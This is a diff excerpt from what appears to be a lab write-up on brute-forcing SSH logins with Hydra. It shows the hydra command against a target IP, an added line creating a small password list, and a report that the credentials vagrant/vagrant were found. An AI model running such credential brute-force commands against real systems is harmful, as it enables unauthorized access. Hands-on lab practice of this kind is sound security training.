@@ -20,6 +20,7 @@ hydra -l "$USERNAME" -P "$PASSWORD_LIST" ssh://"$TARGET_IP" -t 4 -f -V
 The script executed successfully. Hydra found the correct SSH login credentials: username: vagrant, password: vagrant. The attack stopped after identifying the valid password.
 ```bash
 chmod +x ssh_bruteforce.sh
+echo -e "Shahad\Norah\Nora\vagrant\Jude\Jouri\Abood\Hamood\Noor\Rawan\Ali\Ooody" > passwords.txt 
 ./ssh_bruteforce.sh
 ```
 <img src="./screenshots/09_hydra_attack_output.png" alt="User/Pass file created" width="600"/>
